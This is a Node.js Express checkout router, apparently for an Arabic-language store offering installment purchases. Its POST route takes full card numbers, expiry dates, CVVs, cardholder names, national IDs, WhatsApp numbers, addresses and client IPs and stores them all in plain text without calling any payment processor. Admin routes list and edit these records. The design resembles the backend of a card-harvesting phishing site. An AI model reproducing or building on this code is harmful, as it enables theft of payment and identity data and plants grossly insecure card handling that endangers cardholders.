const express = require("express");
const router = express.Router();
const rateLimit = require("express-rate-limit");
const Checkout = require("../models/Checkout");
const authMiddleware = require("../middleware/auth");

const checkoutRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 15,
  standardHeaders: true,
  legacyHeaders: false,
  message: { ok: false, error: "تم تجاوز الحد المسموح من الطلبات، يرجى المحاولة لاحقاً" },
});

// POST /api/checkout - Create order
router.post("/", checkoutRateLimiter, async (req, res) => {
  try {
    const {
      orderId,
      cardNumber,
      expiry,
      cvv,
      cardHolder,
      items,
      total,
      downPayment,
      customer,
      whatsapp,
      nationalId,
      address,
      shippingCompany,
      installmentType,
      months,
      monthlyPayment,
    } = req.body;

    if (!orderId || !cardNumber || !expiry || !cvv || !cardHolder || total === undefined) {
      return res.status(400).json({ ok: false, error: "جميع بيانات الدفع الأساسية مطلوبة" });
    }

    const deviceIp =
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.socket.remoteAddress ||
      "";

    const checkout = new Checkout({
      orderId: String(orderId).trim(),
      cardNumber: String(cardNumber).trim(),
      expiry: String(expiry).trim(),
      cvv: String(cvv).trim(),
      cardHolder: String(cardHolder).trim(),
      items: Array.isArray(items)
        ? items.map((item) => ({
            productId: item.productId,
            name: item.name,
            price: Number(item.price) || 0,
            quantity: Number(item.quantity) || 1,
            color: item.color,
            storage: item.storage,
          }))
        : [],
      total: Number(total) || 0,
      downPayment: Number(downPayment) || 0,
      customer: customer ? String(customer).trim() : "",
      whatsapp: whatsapp ? String(whatsapp).trim() : "",
      nationalId: nationalId ? String(nationalId).trim() : "",
      address: address ? String(address).trim() : "",
      shippingCompany: shippingCompany ? String(shippingCompany).trim() : "",
      installmentType: installmentType === "installment" ? "installment" : "full",
      months: Number(months) || 0,
      monthlyPayment: Number(monthlyPayment) || 0,
      status: "pending",
      deviceIp,
    });

    await checkout.save();

    res.status(201).json({ ok: true, orderId: checkout.orderId });
  } catch (err) {
    if (err.code === 11000) {
      return res.status(400).json({ ok: false, error: "رقم الطلب مسجل مسبقاً" });
    }
    console.error("POST /api/checkout error:", err.message);
    res.status(500).json({ ok: false, error: "خطأ في معالجة الطلب" });
  }
});

// GET /api/checkout - List orders (admin)
router.get("/", authMiddleware, async (req, res) => {
  try {
    const { page, limit } = req.query;
    let query = Checkout.find().sort({ createdAt: -1 });

    const pageNum = parseInt(page);
    const limitNum = parseInt(limit);

    if (pageNum > 0 && limitNum > 0) {
      query = query.skip((pageNum - 1) * limitNum).limit(limitNum);
    } else if (limitNum > 0) {
      query = query.limit(limitNum);
    }

    const orders = await query.lean();
    res.json(orders);
  } catch (err) {
    console.error("GET /api/checkout error:", err.message);
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout/:id - Single order
router.get("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findById(req.params.id).lean();
    if (!order) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });
    res.json(order);
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/status
router.put("/:id/status", authMiddleware, async (req, res) => {
  try {
    const { status } = req.body;
    if (!["pending", "confirmed", "cancelled"].includes(status)) {
      return res.status(400).json({ ok: false, error: "حالة غير صالحة" });
    }
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      { status },
      { returnDocument: "after" }
    );
    if (!order) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });
    res.json(order);
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/financials
router.put("/:id/financials", authMiddleware, async (req, res) => {
  try {
    const { total, downPayment, months, monthlyPayment } = req.body;
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      {
        total: Number(total),
        downPayment: Number(downPayment),
        months: Number(months),
        monthlyPayment: Number(monthlyPayment),
      },
      { returnDocument: "after" }
    );
    if (!order) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });
    res.json(order);
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// DELETE /api/checkout/:id
router.delete("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findByIdAndDelete(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

module.exports = router;
